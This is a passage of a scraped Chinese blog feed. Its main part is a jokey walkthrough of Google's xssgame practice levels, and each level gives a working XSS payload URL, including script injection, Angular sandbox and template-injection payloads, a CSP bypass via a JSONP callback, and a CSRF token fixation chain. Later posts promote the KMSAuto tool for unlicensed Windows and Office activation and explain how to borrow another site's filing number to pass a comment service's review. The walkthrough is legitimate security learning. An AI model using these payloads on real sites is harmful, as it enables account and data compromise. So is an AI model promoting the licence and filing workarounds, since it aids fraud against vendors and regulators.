刚一进来我们就看到了一个黑影脚踏拔丝煎面飞入了一坨乳……啊脂肪中。这个设计游戏的人是个高手，如果是未经此事的年轻人看见，现在可能吓得把裤子都脱了…… 下面进入正片，车辆起步，请坐稳扶好，靠近屏幕的乘客，请系好裤腰带。 LEVEL 1贴心的传送门 上面的英文大致是个玩法的介绍和一些关于本关的信息： 此级别显示XSS的常见原因，其中用户输入直接写入页面而不进行正确的转义。与下面的脆弱应用程序窗口进行交互，并找到一种方法来执行您选择的JavaScript。 您可以在易受攻击的窗口内采取行动，或直接编辑其网址栏。输入一个将使应用程序在JavaScript中执行alert()函数的输入。一旦您弹出警报，该解决方案将在服务器端进行验证，您将能够进入下一个级别。 重要的是，解决方案不需要用户交互 - 打开URL应该足以触发警报。–来自原汁原味的 translate.google.com （自己感受下） 「说人话！」 通过改造URL，在访问原页面时执行 javascript 的 alert()，并且保证任何人直接访问你修改后的URL时都能弹出alert框……。 至于 javascript、alert 是什么，alert 与 XSS 到底是什么关系，为啥 XSS 的游戏要让你用 alert 过关呢，我就不赘述了，百度一下你就上当：） 「上当咋整啊，本来就啥都不会，不能告诉个不上当的方法？」 你别说，还真能： //我是一个不生硬的过度，下面开始正题 →_→ 跑太远扯不回来了 我们打开 chrome 浏览器的开发者工具(F12)看一下这个站的页面相关文件。 其中 index 是主页文件，foogle.png 是大 Foogle Logo，唯独 js_frame.js 不确定。进去看看后发现这个文件是判定你的 XSS 是否符合要求的“xssgame 游戏的官方文件”，这里不分析，因其非本篇重点，直接给定义略过。 index 中是一个简单的 form 表单的提交。我们随便搜点什么后：1.URL 变化2.页面重新加载3.刚刚搜索的内容被一起加载到也页面中。 其中 URL 结尾的 ?query= 后面的字符串跟页面上显示的字符串一致。回到我们的初衷，要让其弹窗。那我们只需要让页面被嵌入一段被加载时弹窗的 javascript 代码段就好了：1&lt;script&gt;alert()&lt;/script&gt; 拼出如下URL： 1http://www.xssgame.com/f/m4KKGHi2rVUN/?query=&lt;script&gt;alert()&lt;/script&gt; 使其在页面加载时就载入含有 alert 效果的 javascript 代码块。 过关： LEVEL 2贴心的传送门 来看一下页面上的信息： 用户提供的数据的每一位都必须正确地转义为其出现的页面的上下文。 这个级别显示为什么。输入一个将使应用程序在JavaScript中执行alert()函数的输入。–来自原汁原味的 translate.google.com （哎，不背锅，哎） 大意是在提醒我们，要注意每一个比特。举个栗子：你以为你家孩子就是你亲生的，但隔壁老王每天冲你笑，毕竟你不是每天晚上都在家。 // 不生硬，一点都不生硬的过度 初次加载的文件中规中矩，一个index里面一个通过 GET 方式提交的 form 表单，表单提交一个 timer 参数给后台，以及一个 js_frame.js 文件。 我们先填一个正常的参数，提交一下试试看，默认是3，那就填3吧： 来看一下新跳转的页面有哪些需要注意的东西： 我们观察发现：1&lt;img id=\"loading\" src=\"/static/img/loading.gif\" style=\"width: 50%\" onload=\"startTimer('3');\" /&gt; 和1&lt;div id=\"message\"&gt;Your timer will execute in 3 seconds.&lt;/div&gt; 两处回显了我们的数据。而前半部 javascript 代码也有一个3：12345678function startTimer(seconds) &#123; seconds = parseInt(seconds) || 3; setTimeout(function() &#123; window.confirm(\"Time is up!\"); window.loading.style.display = 'none'; window.message.innerHTML = '&lt;a href=\"?\"&gt;Go back&lt;/a&gt; to the timer setup page'; &#125;, seconds * 1000);&#125; 提交其他参数后发现，跟我们提交的参数无关，无视之。那么前两处中，我们先看第一处（看到这个字就有点怪怪的感觉……）：1&lt;img id=\"loading\" src=\"/static/img/loading.gif\" style=\"width: 50%\" onload=\"startTimer('3');\" /&gt; 这里可以搞：1onload = \"startTimer('3');\" 怎么搞呢，你需要知道一个知识点：12345678&lt;script&gt; var a = 'a' + alert(); // 或者 '-' 也可以，重点在于让 alert() 参与运算 // 当 alert() 参与运算的时候 // js 会尝试让 alert() 先执行 // 然后取其执行后的返回值再参与前面的运算 // 我就问你任性不。「任性~」『←_← 真尼玛能给自己加戏』&lt;/script&gt; 我们再结合 img 标签的 onload 事件：1234567891011121314onload = \"startTime('?')\"; // 这里需要把上面的知识点利用上 也就是把 alert() 以合适的体位插入 ? 的地方/* 别往下瞅了，下面就是答案了，自己不寻思寻思啊 强行占一行 再来一行 嗯，上下注释符号还能占两行，差不多了。*/// 先尝试直接插入alert()onload = \"startTimer('alert()')\"; // startTimer('alert()'); …… 这不直接当字符串传过去了吗…… 不行// 看看上面的知识点……// 插入 a'+alert()+'aonload = \"startTimer('a'+alert()+'a')\"; // 这应该差不多了…… 可是好像a没啥用啊，不传不也还是字符串吗，只不过是空字符串// 插入 '+alert()+'onload = \"startTimer(''+alert()+'')\"; 嗯，想好了体位，接下来要后退几步，对着 URL 酝酿一下~1http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=&apos;+alert()+&apos; 提交一下……「我曹不对吧」「这也没过关啊，日，讲啥呢一天天。」「你哔哔这么长时间，念经呢这是？」别着急，’+’ 号在URL里有独特的含义，直接写进去就当成URL约定的含义去解读了。我们这边转义一下这个’+’字符,在 chrome 控制台中输入这个函数并按回车，会返回给你一个转义后的字符串：我们用%2B（或%2b）替换一下原来的加号。1http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=&apos;%2Balert()%2B&apos; 过关：上图中的 URL 虽然我们提交的是’%2B’,浏览器最后再显示给你的时候会自动帮你转回来方便你阅读。如果你此时不修改’+’为’%2B’再提交一次，你就会发现你提交的是’+’,我们也并没有再次过关 :)另外，直接用’-‘号其实没这么麻烦，不用转义，直接写就行 :)「……」上面的两chu，我只说了第一chu，那第二chu朋友们自行尝试（第一关的套路照搬过来行不通哟~） LEVEL 3贴心传送门 见证机翻的时刻： 复杂的Web应用程序通常会在JavaScript中生成UI的部分内容。 一些常见的JS功能是执行接收器，这意味着它们将导致浏览器执行出现在其输入中的任何脚本。该级别的应用程序正在使用一个这样的接收器。由于您无法在应用程序中的任何位置输入您的负载，因此您必须手动编辑提供的URL栏中的地址。 目标是利用应用程序中的一个漏洞来执行JavaScript alert()函数。–来自看完觉得没什么卵用的 translate.google.com 其实我在通这个系列的时候是没看这些提示信息的，一是觉得不看也能过，二是怕自己的想法被提示牵着走，这样过关也挺没劲的。嗯，类似「圣人模式」那种惆怅。后来总结的时候呢，发现里面确实是有一些信息的，写经验的时候还是写进来比较好，万一对一些人有帮助呢，所以我就插了个机翻，并因为经费紧张，旁白君的解读直接砍掉了:) // 过渡~看得出来，这是一位吸猫癌患者:12345&lt;div class=\"tab\" id=\"tab1\" onclick=\"chooseTab('1')\"&gt;Cat 1&lt;/div&gt;&lt;div class=\"tab\" id=\"tab2\" onclick=\"chooseTab('2')\"&gt;Cat 2&lt;/div&gt;&lt;div class=\"tab\" id=\"tab3\" onclick=\"chooseTab('3')\"&gt;Cat 3&lt;/div&gt; index 里非常暴躁的来了个 Cat 1 2 3，直让我菊花一紧： 奈何对猫有些抗拒，看见 onclick 事件基本没什么点一下试试看的想法，那就只能看代码了：12345678910111213141516171819function chooseTab(name) &#123; var html = \"Cat \" + parseInt(name) + \"&lt;br&gt;\"; html += \"&lt;img src='/static/img/cat\" + name + \".jpg' /&gt;\"; document.getElementById('tabContent').innerHTML = html; // Select the current tab var tabs = document.querySelectorAll('.tab'); for (var i = 0; i &lt; tabs.length; i++) &#123; if (tabs[i].id == \"tab\" + parseInt(name)) &#123; tabs[i].className = \"tab active\"; &#125; else &#123; tabs[i].className = \"tab\"; &#125; &#125; window.location.hash = name; // Tell parent we've changed the tab top.postMessage(&#123;'url': self.location.toString()&#125;, \"*\");&#125; 这个方法的实现看到第三行就不用看了，已经知道在干嘛了，传进来一个数字，请求相应’数字.jpg’的图片。1需要注意的是通过 innerHTML 写到 div 中。而 innerHTML 方法直接写入的 &lt;script&gt;...&lt;/script&gt; 并不会被执行。 没关系啊，有了上一关的经验，我们可以拼字符串啊。佛死特奥富奥，你得知道个知识点：12345678&lt;img src='' onerror='alert()' /&gt;&lt;!-- 当图片加载错误的时候，就会执行 onerror 中的 alert() 方法 对于本关 我们只需要让他访问一个不存在的图片并让其执行 onerror='alert()' 就OK了 你问我怎么让它执行？ 插啊，插进去不就行了吗 →_→--&gt; 我们拼出如下URL：1http://www.xssgame.com/f/u0hrDTsXmyVJ/#1&apos; onerror=&apos;alert()&apos; 用单引号截断1,使其 scr 指向’1’这个文件，并加入 onerror 事件，而因为’1’这个文件不存在，加载错误，转而执行 onerror 中的 alert() 方法。 过关： LEVEL 4贴心传送门 来看一下提示里面的有效信息: 跨站点脚本不仅仅是正确地转义数据。 有时，即使没有在DOM中注入新的元素，攻击者也可以做坏事。 再来看一下页面内容： 我们先跟着流程走一下，过程中看看有没有什么可利用的地方： sign up 按钮的代码是这样的：1&lt;a href=\"signup?next=confirm\"&gt;Sign up&lt;/a&gt; 点击以后，我们跳转到这个页面： 页面中有一段注释：1&lt;!-- We're ignoring the email, but the poor user will never know! --&gt; ……神经病 next &gt;&gt; 的代码是这样：1&lt;a href=\"confirm?next=welcome\"&gt;Next &gt;&gt;&lt;/a&gt; 点击 next &gt;&gt; 会跳转到下一个页面 页面代码如下： 我们注意到有这样一个地方：123&lt;script&gt; setTimeout(function() &#123; window.location = 'welcome'; &#125;, 1000);&lt;/script&gt; 其中的’Welcome’像是我们 URL 中传入的参数。经传入其他参数测试，发现 window.location = 我们传入的参数。这样问题就简单了，首先，知识点你得有：123456789window.location = 'welcome'; /* 这是一个页面重定向的操作 这里就不展开普及了,可以去 w3school 充充电。 window.location 等同于 window.location.href 而 DOM 的 href 属性呢，支持这样写： &lt;a href='javascript:alert()' &gt; &lt;/a&gt; 咳咳，你懂得。*/ 所以这边只需要传入：’javascript:alert()’ 来替换 ‘welcome’ 就可以了：拼出如下 URL:1http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert() 过关: LEVEL 5贴心传送门 有请我们的翻译君： Angular是一个非常受欢迎的框架，它在安全开发应用程序时拥有自己的一套规则。 其中之一是在Angular的模板系统运行之前修改DOM时应该小心。这个挑战是为什么这很重要。目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。 对，我们查看页面文件结构的时候也注意到了这次的页面使用了 Angular。 「Angular是啥？」 其实 Angular 是啥不重要，即使不了解，还是可以搞的哈，别着急。 我们先常规思路分析一波，先看看页面文件的内容：123456789101112131415161718192021222324&lt;script&gt; angular.module('myApp', []) .controller('myController', ['$scope', function ($scope) &#123; $scope.query = \"\"; $scope.alert = window.alert; &#125;]); var UTM_PARAMS = [\"utm_content\", \"utm_medium\", \"utm_source\", \"utm_campaign\", \"utm_term\"] if (location.search) &#123; var params = location.search.substring(1).split('&amp;'); for (var p in params) &#123; var r = params[p].split('='); if (r.length == 2 &amp;&amp; UTM_PARAMS.indexOf(r[0]) != -1) &#123; var el = document.getElementsByName(r[0]); if (el.length) el[0].value = decodeURIComponent(r[1]); &#125; &#125; &#125; &lt;/script&gt; 这里就提供了足够的信息够我们过关了。这段 js 的逻辑每一步是什么样的我就不细说了，大家自己看吧，我就说说大体是在干什么吧。先定义了一个数组，用来过滤 URL 中的参数。过滤出参数以后呢，去页面上找相应的节点。并给节点赋值。页面中的节点有这几个：1234&lt;input id=\"demo2-query\" name=\"query\" maxlength=\"140\" ng-model=\"query\" placeholder=\"Enter query here...\"&gt;&lt;input name=\"utm_term\" type=\"hidden\"&gt;&lt;input name=\"utm_campaign\" type=\"hidden\" value=\"cpc\"&gt;&lt;input id=\"demo2-button\" type=\"submit\" value=\"Search\"&gt; 聪明的小伙伴听到给页面的节点赋值应该就开窍了，对了，这里可以搞啊可以搞。怎么搞呢？我们先搜下 Angular 中 alert 怎么写：1&#123;&#123;alert()&#125;&#125; 好知道了这个我们构建 URL，就选择 ‘utm_term’ 这个节点吧：1http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term=&#123;&#123;alert()&#125;&#125; 过关： (至于为啥用 Angular，不直接插代码试试看呢，需要自己插一插试试哦~) LEVEL 6贴心传送门 （前面那个关的 boss 死了，儿子又来了？？？） 没什么卵用的翻译（其实还是有用的~）： 导致角度注入的其他常见编程模式是使用服务器端模板系统生成Angular用作其自己的模板的HTML。 即使服务器端模板保证输出中没有“普通”XSS，这一点也是如此。目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。 这次我们看看页面代码，没什么特别的地方。用搜索功能搜一下发现有情况： 手动输入 query 使用 get 方式搜索： 我们注意到页面均显示出我们之前搜索的字符串。 新的页面中的代码： 1&lt;p ng-non-bindable&gt;Sorry, no results were found for &lt;b&gt;1234&lt;/b&gt;.&lt;/p&gt; ‘ng-non-bindable’ 这个是在声明此段落不需要 AngularJS 来编译，也就是说我们上一关的套路不能用了。不过没关系，我们搞 form 中的那个。 我们注意到这样一段代码： 1&lt;script src=\"//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js\"&gt;&lt;/script&gt; 没记错的话之前那关是 1.5.x，我们都知道，软件要及时更新，不然漏洞会被利用搞事情。这个反差好像就是在告诉我们这件事，那就去搜一下 bug 咯，google 一下。 按照惯例，我们先看一下第一个：1http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html 有兴趣的可以去看一下，写的头头是道啊~ 当然我们是通关攻略，这里还是要专注于我们的正事儿啊。 「之前瞎BB，跑偏的时候忘了？」：我们发现其中提及了一个 Angular 1.2.0-1.2.1 的 Sandbox bypasses： 1&#123;&#123;a='constructor';b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()&#125;&#125; 直接拿现成的来用还是很爽的哈，通过 chrome 查看我们查询的时候传的参数是： 我们拼一下 URL：1http://www.xssgame.com/f/rWKWwJGnAeyi/?query=&#123;&#123;a=&apos;constructor&apos;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert()&apos;)()&#125;&#125; 好，提交，过关： 12把&apos;&#123;&apos;、&apos;&#125;&apos;换成&apos;&amp;lcub;&apos;、&apos;&amp;rcub;&apos;试一下(google 来的~我也记不住是啥。)也可以只替换&apos;&#123;&apos;,因为&apos;&#125;&apos;并没有被过滤，不过我查都查了，替！ 新的 URL：1http://www.xssgame.com/f/rWKWwJGnAeyi/?query=&amp;lcub;&amp;lcub;a=&apos;constructor&apos;;b=&amp;lcub;&amp;rcub;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert()&apos;)()&amp;rcub;&amp;rcub; 冲啊，旋风冲锋龙…… 「能他妈不中二了吗？」： 咳咳，过关过关…… LEVEL 7贴心传送门 翻译君： 内容安全策略是防止注入到可扩展XSS中的重要工具。 但这不是一个银弹 - 多次CSP政策可以绕过。这个挑战显示了一种常见的CSP旁路技术。目标是再次使用应用程序中的循环来执行JavaScript alert()函数。 其中提到了一个东西 ‘CSP’ 就是’内容安全策略’, 这是啥东西呢？ 内容安全策略（CSP）是一种计算机安全标准，旨在防止在受信任的网页上下文中执行恶意内容导致的跨站点脚本（XSS），劫持劫持和其他代码注入攻击。– 来自 wiki 百科 这次除了 (index) 文件，我们还有两个地方需要关注下： 按照惯例，我们先看一下页面文件 (index)：1234&lt;a href=\"?menu=YWJvdXQ=\"&gt;About Me&lt;/a&gt;&lt;a href=\"?menu=Y2F0cw==\"&gt;Cats&lt;/a&gt;&lt;a href=\"?menu=ZG9ncw==\"&gt;Dogs&lt;/a&gt;&lt;script src=\"/static/js/level7.js\"&gt;&lt;/script&gt; 我们可以看出来，我们三个标签后会请求 ?menu=不知道是啥玩意。下面加载了叫做 level7.js 的文件。 我们再来看 Level7.js 这个文件，读完他的 js 代码后我们大致明白了他在干什么：12345678910function main()&#123; //找到 URL 中 “menu=？” 的参数，并把？参数动态拼接成一个 &lt;script&gt; 标签，来访问资源。 //atob 对应的是 Base64 编码方式的解码操作，是的，btoa就是编码&#125;function callback(data)&#123; // 通过代码判断，data 应该是 json 格式。 // 取出其中的 title 和 pictures 对应的 value，拼接成 HTML 代码，插入到页面中，来访问资源&#125;main(); //执行 main 方法 这个代码段比较简单，我们看一下 ‘jsonp?menu=about’ 的内容： 我们注意到，其中开头的 callback 与我们 level7.js 中的 callback 方法的名称一样，而且内容中也含有相应的 title 与 pictures，我们基本可以确定这个 json 串返回后会自动执行 callback 函数，像是某种约定，我们去查查看这个 ‘jsonp’： 呀呵，第一个就是知道创宇的文章: JSONP 安全攻防技术 12JSONP：JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 &lt;script&gt;&lt;/script&gt; 元素标签，远程调用 JSON 文件来实现数据传递。 这里不展开讲 JSONP 了，如果感兴趣可以去看原博了解后再回来看文章。 回到正题，文中有这样一段引起了我们的注意： 我们用 callback 这个参数去我们的 Level 7 中测试一下： ok，测试成功，证明后台代码存在缺陷，暂时还不知道要怎么用，不急，上面我们大概扫了下网站的大致流程，接下来我们来仔细分析一下他的代码，看看没有没可以利用的地方。 Level7.js 当然是我们重点关注的对象,我们先来看一下 main 方法：12345function main() &#123; var m = location.search.match('menu=(.*)');// 查找了一下当前 URL 中 'menu=' 后面的参数 var menu = m ? atob(m[1]) : 'about'; // 如果没有获取到参数，则赋值为 'about' document.write('&lt;script src=\"jsonp?menu=' + encodeURIComponent(menu) + '\"&gt;&lt;/script&gt;'); // 在页面中写入 &lt;script&gt; 标签 ，通过 src 请求资源&#125; 因为 encodeURIComponent 的存在，我们截断 script 标签并加入 img 用 onerror 执行 alert 的方式行不通，写入的内容在转义后会被浏览器解析为一个不会被解析成 html 标签的字符串。 想到这里不禁疑惑了一下，正常情况下，menu 的值会有4种可能，空值和 index 页面中三个 a 标签内静态的值，document.write 时写下的 script 标签内的 menu 参数有三种可能：’about’、’cats’、’dogs’。相应的会有三种 callback 的 JSON 对象。 如果我传入一个其他参数，后台做没做 default 处理呢，会返回什么内容呢。 我们这里试一下，因为他接受参数后要进行 base64 解码，所以我们传参时要先进行 base64 编码，’atob’ 函数是解码，编码函数猜也猜到应该是 ‘btoa’ 了~在 chrome 浏览器的控制台下输入： 得到转码后的值，在输入到浏览器中： 我们可以看到 callback 的内容是一个包含我们输入内容的错误提示。 后台并没有做类似 default 的处理，虽然是好事，但是隐隐有种这他妈是在放水的感觉…… 「水多你管得么」 尝试通关： 我们知道，如果我们输入的 menu 参数不是他期望的参数，他会把我们输入的东西显示在页面上。我们构建一个 img 标签传进去试一下： 12先在控制台 btoa(&quot;&lt;img src=&apos;&apos; onerror=&apos;alert()&apos; /&gt;&quot;) 得到 &quot;PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4=&quot;再在浏览器地址栏访问：http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PGltZyBzcmM9Jycgb25lcnJvcj0nYWxlcnQoKScgLz4= chrome 控制台红字提示：1Refused to execute inline event handler because it violates the following Content Security Policy directive: &quot;default-src http://www.xssgame.com/f/wmOM2q5NJnZS/ http://www.xssgame.com/static/&quot;. Either the &apos;unsafe-inline&apos; keyword, a hash (&apos;sha256-...&apos;), or a nonce (&apos;nonce-...&apos;) is required to enable inline execution. Note also that &apos;script-src&apos; was not explicitly set, so &apos;default-src&apos; is used as a fallback. 因为 CSP 的关系，失败了。 没关系，我们换套路，既然 menu 的参数能显示到页面内，我们又知道了这个站有 callback 的缺陷，我们结合一下。 先给个小提示： 自己先想两分钟~ 1234567给 menu 传入经过 base64 编码后的： &lt;script src=&apos;jsonp?callback=alert()%3B//&apos;&gt;&lt;/script&gt; // 转义前为：&lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt;会把 &lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt;显示在页面上，script 标签会尝试加载，触发一个请求，script 而请求的返回内容为： alert();//(&#123;...&#125;)alert(); 后面被注释掉，执行 alert(); 最后我们组织的 URL 为：1http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+ 过关： Level 8最后一关的贴心传送门 QAQ This challenge demonstrates many web security concepts such as CSP, Cross Site Request Forgery Tokens and Self-XSS. 好，我们继续无视提示信息，来看一下这一关。 尊敬下上一关，我们先看一下 Level8.js 的内容： 这个文件负责读取 cookie 的信息，如果读取到了 ‘name’ 的内容，就 document.write 到页面上。通过观察页面我们发现，这个 name 好像是我们自己输入的啊。那我们输入%……&amp;*，他一显示到页面上不就…… 行了，别意淫了： 我们来看看有没有其他可以利用的地方呢。先试试功能吧。 我们随便设置一下名字： 点击 Set 看看发生了什么: 页面上显示了我们的 name，这个不意外，让人奇怪的是他 set 动作的 URL：12345678http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&amp;value=Geekaleo&amp;redirect=index其中：set?name=name&amp;value=Geekaleo&amp;redirect=indexname=name value=Geekaleo 不禁让人菊花一紧那我：name=csrf_token value=balabala 是不是也行？那不是随便设置csrf_token了……redirect=index 显然这个参数是用来跳转的 set csrf_token 我们一会验证，先来试一下这个汇款功能，给 hello kitty 汇一分钱试试水： 我们接到了一个警告福利： 这里我们得到了几个有用的信息： 1.我们输入的不合法金额也就是 ‘amount’ 参数的值被返回到了前台打印了出来。2.此页面没有 CSP 的标识。3.csrf_token 作为参数传递给后台。 根据前两点呢，我们测试一下 把 ‘amount’ 的内容改成一段能够触发 alert() 的脚本： 成功收到一个不符合通关要求的提示，因为 csrf_token 每个人的都不同，这个链接别人访问是酱紫的： 这时候我们之前的猜测就有用处了，这个 token 很可能可以被 set，如果可行，那就通…… 你懂得。 我们来通过 set 设置 token，通过 redirect 跳转到我们之前成功 alert() 的汇款链接，并把其中的 token 设置成我们前面 set 的值。 OK，我们来构建URL： 1234567891011http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer?name=hello+kitty&amp;amount=&lt;script&gt;alert()&lt;/script&gt;&amp;csrf_token=Pass这里要注意，我们如果直接这样访问，redirect 的值会是：transfer?name=hello kitty。也就是到下一个 &amp; 符会被截断。所以我们这里 把这个 &apos;redirect=&apos; 后面的内容处理一下，chrome 控制台：encodeURIComponent(&apos;transfer?name=hello+kitty&amp;amount=%3Cscript%3Ealert()%3C/script%3E&amp;csrf_token=Pass&apos;)得到返回值：transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass好我们替换一下 URL：http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass :) 过关： 愣愣的盯着最后的图，感觉身体被掏空，进入了……贤者时间…… 「别等了，没彩蛋…… QAQ」","tags":[{"name":"从入门到入狱","slug":"从入门到入狱","permalink":"http://ev1l.cn/tags/从入门到入狱/"},{"name":"XSS","slug":"XSS","permalink":"http://ev1l.cn/tags/XSS/"},{"name":"game","slug":"game","permalink":"http://ev1l.cn/tags/game/"}]},{"title":"用 python 写一个exe应用程序 - SuperEncoding","date":"2017-06-28T09:41:27.000Z","path":"2017/06/28/python_SuperEncoding/","text":"作为程序员，能写个程序解决日常需求还是很开心的。这边把应用程序和代码分享下。代码简单到仅仅实现了功能，方便小伙伴们阅读。 程序诞生背景公司女同事在传文件到服务器时总会因为编码问题导致上传或者显示出错。有一次找到我，说起出错这件事，我写了个python的脚本帮她测了下文件编码，发现出错的文件大部分都是编码不正确导致的。这件事过后我抽了个时间。把之前的脚本改成了一个exe可执行程序，这样就省得来找我测编码了（对，没错，注孤生）。 程序简介选择文件，显示文件编码信息。听起来很简单对吧，嗯，写起来也很简单。 实现思路我们需要干三件事1.python 获取文件编码信息的代码（其实就是几行代码~）2.通过 GUI 实现选择文件显示编码信息（我这里选择的 Tkinter）3.打包成 exe（我这里选择的PyInstaller） 资源 获取方式 获取地址 备注 github SuperEncoding_github 百度云 SuperEncoding_百度云 提取码: bcyj","tags":[{"name":"工具","slug":"工具","permalink":"http://ev1l.cn/tags/工具/"},{"name":"python","slug":"python","permalink":"http://ev1l.cn/tags/python/"}]},{"title":"Windows 及 Office 激活 —— KMS","date":"2017-06-01T09:43:35.000Z","path":"2017/06/01/crackWindows10/","text":"一款强大的 windows、office 激活软件—KMS 简单介绍一下：激活windows、office 并可以自己建立计划任务每隔一段时间自动重新激活一次（激活时间180天）。 进入软件选择KMSAuto Net -&gt; Activation -&gt; Activate windows (office) 倔强的相信自己能找到激活码，奈何现实告诉我不如老老实实的用KMS…… 下载方式 下载地址 备注 百度云 KMS Tools 提取码: e86k","tags":[{"name":"工具","slug":"工具","permalink":"http://ev1l.cn/tags/工具/"}]},{"title":"国内无备案网站使用畅言评论系统","date":"2017-05-12T23:50:28.000Z","path":"2017/05/13/changyancrack/","text":"本来朋友圈说昨晚把教程发出来，结果……到家后衣服都没脱就睡了。早上五点恢复意识，磨蹭到7点才打开电脑。 背景畅言评论系统是搜狐搞出来的一个免费的评论系统，对于小站不想花精力去做评论系统的人确实很方便。类似的评论系统常用的有：多说、网易云跟帖、友言等。多说团队宣布2017年6月1日正式关闭服务，不巧的是我用的也是多说，所以开始了辗转之旅。多番体验后选择使用畅言，网易云跟帖的风格让我感觉跟blog格格不入也是一方面因素。 适合人群： github建站未购买私人域名无法备案 已拥有国内域名但因种种原因没有备案 原理利用畅言网站备案审核后的白名单机制让自己的网站也能使用畅言。是的，如果你比较聪明的话，看到这里你应该知道该怎么搞了。 细节正常注册畅言用户这一步跳过了，确实没什么可说的 提交申请 因为我已经审核通过，所以上面显示已通过，不用纠结这一点。关于备案，我当初用baidu站点尝试，完全是想法的尝试没想那么多。不过若畅言团队封掉同一站点网址多个实例注册的话，审核很容易就不通过了。建议去使用一些其他站点的备案信息。备案信息获取可百度：备案信息查询。随便找域名，拿来备案信息就用~然后提交审核，耐心等待审核通过。 修改域名白名单 审核通过完毕后，按照图中方式修改域名白名单，然后等待官方确认修改的通知。收到通知后，你的就可以开心的使用畅言了~ 已知小问题无法在本地调适时，即 localhost 访问时显示评论，不过不影响使用。如果大家有解决方案欢迎告诉我~","tags":[{"name":"工具","slug":"工具","permalink":"http://ev1l.cn/tags/工具/"},{"name":"音乐","slug":"音乐","permalink":"http://ev1l.cn/tags/音乐/"}]},{"title":"那些萦绕在我记忆里的一些歌曲(未完 更于2017-04-27)","date":"2017-04-26T16:19:49.000Z","path":"2017/04/27/sgbtLC/","text":"他让她住在他的心上，走到哪里便带到哪里，记忆有多久，她便有多么长寿。 蛮喜欢下雨天，小时候总是疯疯癫癫的跑出去淋雨。 长大了，一个人的时候总会望着窗外的雨出神，有时会想着谁，有时不知道该想想谁。 一旦发生过这样的事情，便很难在下雨天抑制住自己的思绪。 有时会想让自己不去想，那种空灵的感觉总是让人没办法拒绝又会浪费掉精力和时间。 印象中克制的最好的一次大概是听着吵吵的音乐，在雨中阴沉着脸赶路吧。 汪苏泷、徐良和许嵩。好多人为了凸显自己的音乐品味对他们嗤之以鼻。 现在喊麦的mc们也被骂的很惨，我不觉得自己多有品位。 讨厌的东西我不会去听，也不会去关注相关的任何讯息，我不喜欢你，所以我的世界里没有你，很简单。 当初他们三位的歌曲陪伴我度过了一个又一个周末，一个又一个朝阳到余晖。 现在再听起他们的歌，不会像当初那么陶醉，也没有青涩时期的画面扑面而来，情绪也不会跟着歌曲进入副歌而忽起波澜。 像评论里说的：“现在听没有那时的感觉了。真的是回不去了[心碎]。” 我始终觉得，让你困在过去的歌曲，不是你应该听的歌。 我在听的，多半是这段回不去的路，和这路上的每一步吧。 梁静茹的歌总是会让你体会到那种纯粹的感情 “我可以假装看不见，也可以偷偷的想念” “知了也睡了，安心的睡了” 那时的我们，向往着这种连空气都会变得很轻松的感情。 当初单纯，幸运的是，我们嘴边哼着的歌，还要更单纯。 当年被胡彦斌这骚气的声线与唱法镇住了，听了一次想忘都难。 当初有一个可以打电话点歌、点视频的互动电视频道，视频平均4分钟左右一段，2元点一次。 在没人点播的时候，为了怕观众无聊，放的就是这首胡彦斌的歌，当下俗称的BMG就是它了。 如果你想看一集动画片，你可能要点4-5次才能看完一集。 想想当初挺有意思的，每天守着这个台，有一集没一集的跟着点播的土豪瞎看。 有时看一集动画可能会被插播进来七八次歌曲MV，时间成本也蛮高的。 守着电视的小伙伴们也慢慢的有了默契，只要你点了动画片的第一part，总会有其他小伙伴帮你点完。 众筹的思想在小朋友的身上已经生根发芽了。 那时我还听不懂。 现在想想： “太多的借口” “太多的理由” “为了爱情我也背叛了所有” “如果你想离开我” “就别再畏畏缩缩” 乍一听，是一个痴情人被爱情折磨的终于不想承受的故事。 可是仔细想想，如果真想离开你，还会找借口和理由吗？ 既已不再留恋，何必处处遮掩？ 你含泪看着对方的时候，又怎知对方不是在含泪望着你。 悄悄地喜欢一个人 把握的恰到好处 刚好瞒着他的同时，被全世界看穿了自己 在那个人身上用尽了我们能表达出来的所有情绪 把每一个电视剧里的故事都在脑海中排练了一遍 一个不经意的动作，一句很自然的话 能让自己对着自己在脑海中低语很久 思绪随着天色浅浅有了光亮 才叹着气睡去 其实，我们只是刚好在那个时候 需要完全陌生的人 来感动自己 不是我们做了那么多，最后却只感动了自己 而是我们所做的一切，都只是为了感动自己","tags":[{"name":"音乐","slug":"音乐","permalink":"http://ev1l.cn/tags/音乐/"},{"name":"Leo","slug":"Leo","permalink":"http://ev1l.cn/tags/Leo/"}]},{"title":"给程序员的 30 个基本 Python 贴士与技巧","date":"2017-04-18T16:16:01.000Z","path":"2017/04/19/python_30_tips/","text":"如果你已经在用 python 了，相信这篇 blog 会对你有帮助的。如果你还没有使用 